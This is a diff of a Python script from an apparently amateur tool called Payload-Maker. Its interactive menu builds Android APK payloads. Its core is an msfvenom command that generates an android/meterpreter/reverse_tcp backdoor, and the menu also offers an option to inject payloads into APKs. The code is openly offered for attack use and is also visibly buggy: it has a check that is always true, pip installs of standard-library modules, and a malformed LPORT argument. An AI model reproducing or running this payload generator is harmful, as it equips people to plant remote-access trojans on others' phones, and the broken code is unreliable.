@@ -1,17 +1,38 @@
 #Paycore v1.0
 #it contain all the def functions for the source code
-
+##############modules cheeker###########
+class modules():
+	#1-socket
+	def socket_module_cheeke():
+		try :
+			import socket as socket
+		except :
+			import pip
+			pip.main(["install", "socket"])
+			import socket as socket
+		#2-webbrowser
+	def webbrowser_moudule_cheeker():
+		try:
+			from webbrowser import open
+		except:
+			import pip
+			pip.main(["install","webbrowser"])
+			from webbrowser import open
 ########importing the modules########
 
 import os
 import sys
 import time
-import webbrowser
-import socket
+modules.socket_module_cheeke()
+modules.webbrowser_moudule_cheeker()
 from Payload import *
-############getting the lhost
+from core.banner import *
+############getting the lhost#################
 lhost = socket.gethostbyname(socket.gethostname())
+
+
 ############def functions#############
+
 
 
 def restart_program():
@@ -27,16 +48,25 @@ def slowprint(z):
 		time.sleep(0.01)
 
 
+
 def paymak():
 	os.system("clear")
 	print("\033[36m==================[>>"+"\033[35m making the apk payload"+"\033[36m<<]==================")
 	port = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter lport"+"\033[33m use 8080 it the best port "+"\033[32m : "+"\033[37m")
-	name = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter a name for the payload "+"\033[33m without "+"\033[36m("+"\033[34m .apk"+"\033[36m)"+"\033[32m : "+"\033[37m")
-	os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /sdcard/{name}.apk")
-	print("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m DONE"+"\033[37m")
-	time.sleep(2)
-	os.system("clear")
-	return payload()
+	if type(port == int):
+		name = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter a name for the payload "+"\033[33m without "+"\033[36m("+"\033[34m .apk"+"\033[36m)"+"\033[32m : "+"\033[37m")
+		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /sdcard/{name}.apk")
+		print("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m DONE"+"\033[37m")
+		time.sleep(2)
+		os.system("clear")
+		return start()
+	
+	else :
+		print('he;;')
+		time.sleep(4)
+		os.system("clear")
+		return paymak()
+
 
 def command():
 	os.system("clear")
@@ -142,3 +172,37 @@ def youtube():
 		print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+cha_cheeke+"\033[31m it not found")
 		time.sleep(2)
 		return payload()
+
+def start():
+	os.system("clear")
+	banner_front()
+	while True :
+		options_cheeker = input(" \033[36m  \n PaMake]=>> "+"\033[37m")
+		if options_cheeker == "help":
+			time.sleep(2)
+			print("\033[33m       "+r"  command                                          description")
+			print("\033[36m  "+r"      set payload                             use this command to creat a payload")
+			print("\033[36m  "+r"     inject_apk                              use this command to inject a apk with a payload")
+			print("\033[36m  "+r"     show options                    it will show you what you have to do after creating a payload")
+			print("\033[36m  "+r"    show cre_chann                          it will show you all the creator of this script acount")
+			print("\033[32m                     subscribe to my youtube channel please")
+			print("\033[36m  "+r"        help                                     it will show you this help menu")
+			print("\033[36m  "+r"        clear                                       it will clear the window")
+			print("\033[36m  "+r"        exit                                       it will exit the programme")
+		elif options_cheeker == "set payload":
+			paymak()
+		elif options_cheeker == "show options":
+			command()
+		elif options_cheeker == "show cre_chann":
+			youtube()
+		elif options_cheeker == "clear":
+			os.system("clear")
+		elif options_cheeker == "exit":
+			print("\033[36m  ["+"\033[31m!"+"\033[36m]" +"\033[33m exiting...  "+"\033[37m")
+			time.sleep(3)
+			print("\033[36m  ["+"\033[32m+"+"\033[36m]"+"\033[32m Thanks for using Payload-Maker"+"\033[37m")
+			sys.exit()
+		else:
+			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+options_cheeker+"\033[31m it not found")
+			print("\033[36m ["+"\033[32m+"+"\033[36m]"+"\033[35m try to type"+"\033[33m help "+"\033[35mto show the help menu")
+			
